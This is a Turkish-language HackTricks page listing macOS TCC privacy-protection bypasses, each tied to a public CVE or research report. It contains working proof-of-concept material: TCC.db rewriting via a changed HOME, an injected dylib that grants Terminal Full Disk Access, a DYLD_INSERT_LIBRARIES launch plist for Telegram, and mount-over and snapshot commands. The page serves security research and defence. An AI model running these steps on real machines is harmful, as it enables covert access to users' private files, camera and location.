# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## İşlevselliğe göre

### Write Bypass

Bu bir bypass değildir; yalnızca TCC'nin çalışma şeklidir: **Yazmaya karşı koruma sağlamaz**. Terminal'in **bir kullanıcının Desktop alanını okuma erişimi yoksa bile buraya yazabilir**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Yeni **dosyaya**, **creators app** uygulamasına dosyayı okuma erişimi vermek için **`com.apple.macl` extended attribute** eklenir.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Kullanıcının fark etmeden **kabul etmesini** sağlamak için **TCC isteminin üzerine bir pencere yerleştirmek** mümkündür. PoC'yi [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**'de** bulabilirsiniz.<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Saldırgan, **`Info.plist`** içinde **herhangi bir isimle** (ör. Finder, Google Chrome...) **uygulamalar oluşturabilir** ve bunların bazı TCC korumalı konumlara erişim istemesini sağlayabilir. Kullanıcı, bu erişimi isteyenin meşru uygulama olduğunu düşünecektir.\
Ayrıca, **meşru uygulamayı Dock'tan kaldırıp sahte uygulamayı Dock'a koymak** mümkündür. Böylece kullanıcı, aynı simgeyi kullanabilen sahte uygulamaya tıkladığında sahte uygulama meşru uygulamayı çağırabilir, TCC izinleri isteyebilir ve bir malware çalıştırabilir; bu da kullanıcının erişimi meşru uygulamanın istediğine inanmasını sağlar.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Daha fazla bilgi ve PoC için:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Varsayılan olarak **SSH üzerinden erişim "Full Disk Access" iznine sahipti**. Bunu devre dışı bırakmak için SSH'nin listede bulunması ancak devre dışı bırakılmış olması gerekir (listeden kaldırmak bu ayrıcalıkları kaldırmaz):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: Varsayılan olarak SSH üzerinden erişim "Full Disk Access" iznine sahipti. Bunu devre dışı bırakmak için SSH'nin listede bulunması ancak devre dışı bırakılmış olması gerekir (listeden kaldırmak...](<../../../../../images/image (1077).png>)

Burada bazı **malware'lerin bu korumayı nasıl bypass edebildiğine** dair örnekleri bulabilirsiniz:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> SSH'yi etkinleştirebilmek için artık **Full Disk Access** gerektiğini unutmayın.

### Handle extensions - CVE-2022-26767

**`com.apple.macl`** attribute'ı, **belirli bir uygulamaya dosyayı okuma izinleri vermek** için dosyalara atanır. Bu attribute, bir dosya bir uygulamanın üzerine **drag\&drop** edildiğinde veya kullanıcı bir dosyayı **varsayılan uygulamayla** açmak için **çift tıkladığında** ayarlanır.

Bu nedenle bir kullanıcı, tüm extension'ları işlemek üzere **kötü amaçlı bir uygulamayı kaydedebilir** ve herhangi bir dosyayı **açması** için Launch Services'i çağırabilir (böylece kötü amaçlı dosyaya dosyayı okuma erişimi verilir).<sup>[[23]](#references)</sup>

### iCloud

**`com.apple.private.icloud-account-access`** entitlement'ı sayesinde **iCloud token'ları sağlayacak** olan **`com.apple.iCloudHelper`** XPC service ile iletişim kurulabilir.

**iMovie** ve **Garageband** bu entitlement'a ve buna izin veren diğer entitlement'lara sahipti.

Bu entitlement'tan **icloud token'larını almak** için kullanılan exploit hakkında daha fazla **bilgi** için şu konuşmaya bakın: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** iznine sahip bir uygulama **diğer uygulamaları kontrol edebilir**. Bu, **diğer uygulamalara verilen izinleri kötüye kullanabileceği** anlamına gelir.<sup>[[2]](#references)</sup>

Apple Scripts hakkında daha fazla bilgi için:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Örneğin, bir uygulamanın **`iTerm` üzerinde Automation izni** varsa; bu örnekte **`Terminal`**, iTerm üzerinde erişime sahiptir:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA'ya sahip olmayan Terminal, iTerm'ı çağırabilir; iTerm FDA'ya sahip olduğundan, Terminal onu eylemler gerçekleştirmek için kullanabilir:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder Üzerinden

Ya da bir App'in Finder üzerinden erişimi varsa, aşağıdaki gibi bir script çalıştırabilir:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Uygulama davranışına göre

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Kullanıcı alanındaki **tccd daemon**, TCC kullanıcı veritabanına şu konumdan erişmek için **`HOME`** **env** değişkenini kullanıyordu: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[Bu Stack Exchange gönderisine](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) göre ve TCC daemon'ı mevcut kullanıcının alanı içinde `launchd` aracılığıyla çalıştığından, kendisine aktarılan **tüm environment variable** değerlerini **kontrol etmek** mümkündür.<sup>[[19]](#references)</sup>\
Böylece bir **attacker**, **`launchctl`** içinde **`$HOME` environment** değişkenini **kontrol edilen** bir **directory** gösterecek şekilde ayarlayabilir, **TCC** daemon'ını **restart** edebilir ve ardından son kullanıcıdan hiçbir zaman onay istemeden kendisine **kullanılabilir her TCC entitlement'ını** vermek için **TCC database**'ini doğrudan değiştirebilir.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes, TCC tarafından korunan konumlara erişebiliyordu; ancak yeni oluşturulan bir not **korunmayan bir konuma kaydediliyordu**. Bu nedenle saldırgan, Notes'tan korunan bir dosyayı bir nota kopyalamasını isteyebilir ve ardından elde edilen verilere korunmayan konumdan erişebilirdi:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`libsecurity_translocate` kütüphanesine sahip `/usr/libexec/lsd` binary'si, **nullfs** mount oluşturmasına izin veren `com.apple.private.nullfs_allow` entitlement'ına ve her dosyaya erişmek için **`kTCCServiceSystemPolicyAllFiles`** içeren `com.apple.private.tcc.allow` entitlement'ına sahipti.

"Library" konumuna quarantine attribute eklemek, **`com.apple.security.translocation`** XPC service'ini çağırmak ve ardından Library'yi tüm Library içindeki belgelerin **erişilebildiği** **`$TMPDIR/AppTranslocation/d/d/Library`** konumuna map etmek mümkündü.

### CVE-2024-44131 - FileProvider symlink race

Dosya işlemlerini **privileged helper**'a devreden uygulamalar (burada **`fileproviderd`** / **`Files.app`**), öğeleri **kullanıcı adına** kopyalar veya taşır; bu nedenle copy işlemi caller yerine helper'ın yetkileriyle çalışır.

Jamf Threat Labs, işlemden önce gerçekleştirilen symlink validation'ın **race edilebildiğini** gösterdi: symlink'i kontrol edilen **son** path component'ına yerleştirmek yerine saldırgan, copy işlemi başladıktan **sonra** path'in **ara** dizinlerinden birini değiştirir. Ardından privileged helper, saldırganın kontrol ettiği link'i takip eder ve hiçbir zaman prompt göstermeden TCC tarafından korunan konumları okur/yazar.<sup>[[5]](#references)</sup>

Path'lerinde random UUID ile **korunmayan** dizinler (örneğin `~/Library/Mobile Documents/com~apple~CloudDocs`) en kolay hedeflerdir; çünkü saldırgan race gerçekleştirmek için gereken tam path'i tahmin edebilir.

> [!TIP]
> Aranması gereken genel pattern şudur: **bir path'i birden fazla kez resolve eden herhangi bir privileged process** (check-then-use veya source ve destination'ı ayrı ayrı resolve eden `rename()`/`copyfile()`), path'in ortasındaki bir dizin değiştirilerek race edilebilir. Yalnızca `O_NOFOLLOW_ANY`, zaten açılmış bir directory FD üzerinde `openat()` veya `realpath()` + yeniden validation işlemi bu açığı gerçekten kapatır.

Daha fazla bilgi için [**Jamf Threat Labs writeup'ı**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3`, environment variable'lar tarafından yönlendirilen bir logging hook ekleyen `SQLITE_ENABLE_SQLLOG` ile build edilebilir ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **açılan her database için**, **database file'ın bir copy'si** ve SQL statement'larının bir log'u `path` içine yazılır (directory önceden mevcut olmalıdır).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – bir DB her açıldığında/attach edildiğinde mevcut bir dosyayı yeniden kullanmak yerine **yeni bir copy** oluşturur.
- **`SQLITE_SQLLOG_CONDITIONAL`** – yalnızca ana DB'nin yanında bir `<database>-sqllog` file'ı varsa bir connection'ı log'lar.

Bu variable'ı FDA'ya sahip olan ve SQLite database'lerini açan bir process'e inject edebilirseniz, korunan bu database'leri kontrol ettiğiniz bir directory'ye **memnuniyetle copy'ler**. Destination filename'ı saldırganın kontrolündeki verilerden türetildiği için destination'a yerleştirilen bir **symlink**, aynı primitive'i hedef process'in privileges'larıyla **arbitrary file write** işlemine dönüştürür.

### **SQLITE_AUTO_TRACE**

Environment variable **`SQLITE_AUTO_TRACE`** ayarlanırsa, **`libsqlite3.dylib`** library'si tüm SQL query'lerini **log'lamaya** başlar. Birçok application bu library'yi kullandığından, tüm SQLite query'lerini log'lamak mümkündü.<sup>[[22]](#references)</sup>

Bazı Apple application'ları bu library'yi TCC tarafından korunan bilgilere erişmek için kullanıyordu.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### env-var driven file writes avı

Önceki iki örnek aynı generic technique'in örnekleridir ve daha fazlasını aramak faydalıdır: **TCC-privileged uygulamalara yüklenen framework'ler genellikle sürecin caller-controlled bir path'te dosya oluşturmasını sağlayan debug/logging environment variable'ları sunar**.

Bunları bulmak için workflow:

1. FDA veya başka bir değerli TCC permission'ı olan bir target seçin (`Music`, `TV`, `Terminal`, MDM agents...) ve linklediği framework'leri listeleyin (`otool -L`, `vmmap`).
2. Bu framework'lerde `getenv` string'lerini arayın: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Aday variable'ları `launchctl setenv NAME /path/you/control` ile ayarlayın, uygulamayı başlatın ve `fs_usage -w -f filesys <pid>` veya `sudo fs_usage | grep <path>` ile filesystem üzerinde ne yaptığını izleyin.
4. Süreç sizin directory'nizde bir dosya **oluşturuyor veya yeniden adlandırıyorsa**, bir write primitive elde etmişsinizdir: destination'ı bir symlink'e yönlendirin (veya yukarıdaki CVE-2024-44131'de olduğu gibi bir intermediate directory için race gerçekleştirin) ve yazma işlemini `~/Library/Application Support/com.apple.TCC/TCC.db` üzerine yönlendirin.

> [!TIP]
> Bunu sınırlayan iki şey vardır. İlk olarak, uygulama [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement'ını taşımıyorsa ("dynamic linker environment variables'dan etkilenip etkilenemeyeceğini belirten ve app'in process'ine code inject etmek için kullanabileceğiniz Boolean value"), **`DYLD_*` variable'ları hardened-runtime binary'leri için yok sayılır** — ayrıca bkz. [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). İkinci olarak Apple, framework debug variable'larını rapor edildikçe tek tek kaldırır; bu nedenle bir macOS release'inde çalışan bir variable çoğunlukla bir sonraki release'te yoktur. Bir variable ayarladıktan sonra uygulama sessizce başlatılmayı reddederse, bu variable'ın zaten filtrelendiğini varsayın.<sup>[[7]](#references)[[8]](#references)</sup>

Linker variable'larıyla yapılan eşdeğer trick için [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) sayfasına bakın.

### Apple Remote Desktop

Root olarak bu service'i etkinleştirebilirdiniz ve **ARD agent'ı full disk access'e sahip olurdu**; bu da bir user tarafından yeni bir **TCC user database** kopyalatmak için abuse edilebilirdi.

## **NFSHomeDirectory** ile

TCC, user'a özgü resource'lara erişimi kontrol etmek için user'ın HOME folder'ında şu database'i kullanır: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Bu nedenle user, `$HOME` env variable'ı **farklı bir folder'ı** gösterecek şekilde TCC'yi restart etmeyi başarırsa, user **/Library/Application Support/com.apple.TCC/TCC.db** içinde yeni bir TCC database oluşturabilir ve TCC'yi herhangi bir app'e herhangi bir TCC permission vermesi için kandırabilir.

> [!TIP]
> Apple'ın, **`$HOME` değerini** user profile içinde **`NFSHomeDirectory`** attribute'unda saklanan setting'i kullanarak belirlediğini unutmayın; bu nedenle bu değeri değiştirme permission'larına (**`kTCCServiceSystemPolicySysAdminFiles`**) sahip bir application'ı compromise ederseniz, bu seçeneği bir TCC bypass ile **weaponize** edebilirsiniz.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**İlk POC**, user'ın **HOME** folder'ını değiştirmek için [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ve [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kullanır.

1. Target app için bir _csreq_ blob elde edin.
2. Gerekli access ve _csreq_ blob ile sahte bir _TCC.db_ dosyası yerleştirin.
3. User'ın Directory Services entry'sini [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ile export edin.
4. User'ın home directory'sini değiştirmek için Directory Services entry'sini değiştirin.
5. Değiştirilmiş Directory Services entry'sini [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) ile import edin.
6. User'ın _tccd_'sini durdurun ve process'i reboot edin.

İkinci POC, değer olarak `kTCCServiceSystemPolicySysAdminFiles` içeren `com.apple.private.tcc.allow` entitlement'ına sahip olan **`/usr/libexec/configd`** binary'sini kullandı.\
`configd`'yi **`-t`** option'ı ile çalıştırmak mümkündü; bu option ile attacker **yüklemek üzere custom bir Bundle belirtebilirdi**. Dolayısıyla exploit, user'ın home directory'sini değiştiren **`dsexport`** ve **`dsimport`** method'larını bir **`configd` code injection** ile **değiştirir**.

Daha fazla bilgi için [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) sayfasına bakın.<sup>[[11]](#references)</sup>

## Process injection ile

Bir process içine code inject etmek ve TCC privilege'larını abuse etmek için farklı teknikler vardır:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Ayrıca TCC bypass için bulunan en yaygın process injection, **plugins (load library)** aracılığıyladır.\
Plugin'ler genellikle library veya plist biçiminde olan ve **main application tarafından yüklenerek** kendi context'i altında çalıştırılan ek code'lardır. Bu nedenle main application'ın granted permission'lar veya entitlement'lar aracılığıyla TCC restricted file'lara erişimi varsa, **custom code da bu erişime sahip olur**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` application'ı **`kTCCServiceSystemPolicySysAdminFiles`** entitlement'ına sahipti, **`.daplug`** extension'ına sahip plugin'ler yüklüyordu ve **hardened** runtime'a sahip değildi.

Bu CVE'yi weaponize etmek için, **TCC bypass** gerçekleştirmek üzere **user'ların TCC database'ini ele geçirebilmek** amacıyla **`NFSHomeDirectory`** değiştirilir (önceki entitlement abuse edilerek).

Daha fazla bilgi için [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) sayfasına bakın.<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** binary'si `com.apple.security.cs.disable-library-validation` ve `com.apple.private.tcc.manager` entitlement'larına sahipti. İlki **code injection'a izin verirken**, ikincisi ona **TCC'yi yönetme access'i** veriyordu.

Bu binary, `/Library/Audio/Plug-Ins/HAL` folder'ından **third-party plug-in'ler** yüklemeye izin veriyordu. Bu nedenle bir plugin yüklemek ve TCC permission'larını abuse etmek mümkündü; PoC:<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) bakın.<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O üzerinden kamera akışını açan sistem uygulamaları (**`kTCCServiceCamera`** içeren uygulamalar), `/Library/CoreMediaIO/Plug-Ins/DAL` konumunda bulunan bu eklentileri (SIP tarafından kısıtlanmayan) **process** içinde yükler.

Buraya yalnızca yaygın **constructor** içeren bir library yerleştirmek **code inject** etmek için yeterlidir.

Birden fazla Apple uygulaması bu açıdan savunmasızdı.

### Firefox

Firefox uygulamasında `com.apple.security.cs.disable-library-validation` ve `com.apple.security.cs.allow-dyld-environment-variables` entitlements'ları bulunuyordu:<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Bu özelliğin nasıl kolayca exploit edilebileceği hakkında daha fazla bilgi için [**orijinal raporu inceleyin**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

`/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` binary'si **`com.apple.private.tcc.allow`** ve **`com.apple.security.get-task-allow`** entitlement'larına sahipti; bu da process içine code inject etmeyi ve TCC ayrıcalıklarını kullanmayı mümkün kılıyordu.

### CVE-2023-26818 - Telegram

Telegram, **`com.apple.security.cs.allow-dyld-environment-variables`** ve **`com.apple.security.cs.disable-library-validation`** entitlement'larına sahipti. Bu nedenle, kamera ile kayıt yapmak gibi **izinlerine erişim sağlamak** için kötüye kullanılması mümkündü. [**Payload'ı writeup'ta bulabilirsiniz**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Bir library yüklemek için env variable'ın nasıl kullanıldığına dikkat edin: bu library'yi inject etmek amacıyla bir **custom plist** oluşturuldu ve bunu başlatmak için **`launchctl`** kullanıldı:<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## open çağrıları aracılığıyla

Sandboxed durumdayken bile **`open`** çağrısı yapmak mümkündür.

### Terminal Scripts

Özellikle teknik kişiler tarafından kullanılan bilgisayarlarda terminale **Full Disk Access (FDA)** vermek oldukça yaygındır. Bununla birlikte **`.terminal`** script'lerini çağırmak da mümkündür.

**`.terminal`** script'leri, çalıştırılacak komutun **`CommandString`** anahtarında bulunduğu bunun gibi plist dosyalarıdır:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Bir uygulama, /tmp gibi bir konuma bir terminal script'i yazabilir ve bunu şu şekilde bir komutla başlatabilir:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Mount ederek

### CVE-2020-9771 - mount_apfs TCC bypass ve yetki yükseltme

**Herhangi bir kullanıcı** (ayrıcalıksız kullanıcılar bile) bir Time Machine snapshot'ı oluşturup mount edebilir ve bu snapshot'taki **TÜM dosyalara erişebilir**.\
Gerekli **tek ayrıcalık**, kullanılan uygulamanın (`Terminal` gibi) bir yönetici tarafından verilmesi gereken **Full Disk Access** (FDA) erişimine (`kTCCServiceSystemPolicyAllfiles`) sahip olmasıdır.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Daha ayrıntılı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

TCC DB file korunsa bile, yeni bir TCC.db file'ını **directory üzerine mount etmek** mümkündü:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) içindeki **full exploit**'i inceleyin.<sup>[[21]](#references)</sup>

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2) içinde açıklandığı üzere, bu CVE `diskarbitrationd`'yi abuse etti.<sup>[[16]](#references)</sup>

Public `DiskArbitration` framework'ündeki `DADiskMountWithArgumentsCommon` fonksiyonu security check'lerini gerçekleştiriyordu. Ancak `diskarbitrationd`'yi doğrudan çağırarak ve bu nedenle path içinde `../` öğeleri ile symlink'ler kullanarak bunu bypass etmek mümkündü.

Bu durum, `diskarbitrationd`'nin `com.apple.private.security.storage-exempt.heritable` entitlement'ı sayesinde TCC database'inin üzerine mount etmek de dahil olmak üzere, bir attacker'ın herhangi bir konumda arbitrary mount işlemleri gerçekleştirmesine olanak sağladı.

### asr

**`/usr/sbin/asr`** aracı, tüm diski kopyalayıp TCC protections'ı bypass ederek başka bir konuma mount etmeye olanak sağlıyordu.

### CVE-2022-22655 - Location Services

Location Services, diğer servisler gibi bir TCC database'inde saklanmaz. Kendi allow-list'ini **`/var/db/locationd/clients.plist`** dosyasında tutan `locationd` tarafından yönetilir:<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Her giriş istemciye (bundle ID veya çalıştırılabilir dosya yolu) göre anahtarlanır ve `Authorized`, `BundleId`, `Executable` ve `Registered` gibi alanlar içerir.<sup>[[4]](#references)</sup>

`clients.plist` dosyasının kendisi Sandbox/TCC tarafından korunur ve root olarak bile düzenlenemez — ancak **`/var/db/locationd/` dizini mount edilmekten korunmuyordu**. Bu nedenle root olarak çalışan bir attacker, kendi `clients.plist` dosyasını içeren bir disk image oluşturabilir (binary dosyasını `Authorized` olarak işaretleyerek), bunu dizinin üzerine mount edebilir ve sahte allow-list'in etkinleşmesi için `locationd`'ı yeniden başlatabilirdi.<sup>[[3]](#references)</sup>

> [!TIP]
> Bu, yukarıdaki `hdiutil`/`mount` TCC bypass'leriyle aynı kalıptır: *dosya* korunur, dosyanın bulunduğu *dizin* korunmaz; bu nedenle dosya yerine dizinin tamamını değiştirirsiniz.

## Startup apps ile


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep ile

Bazı durumlarda dosyalar e-postalar, telefon numaraları, mesajlar gibi hassas bilgileri korumasız konumlarda depolar (Apple açısından bunlar bir vulnerability sayılır).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Bu artık çalışmıyor, ancak [**geçmişte çalışıyordu**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) kullanmanın başka bir yolu:<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: macOS Transparency, Consent, and Control (TCC) Framework'ünü Bypass Etme](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [macOS TCC User Privacy Protections'ı Kazara ve Tasarım Yoluyla Bypass Etme](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
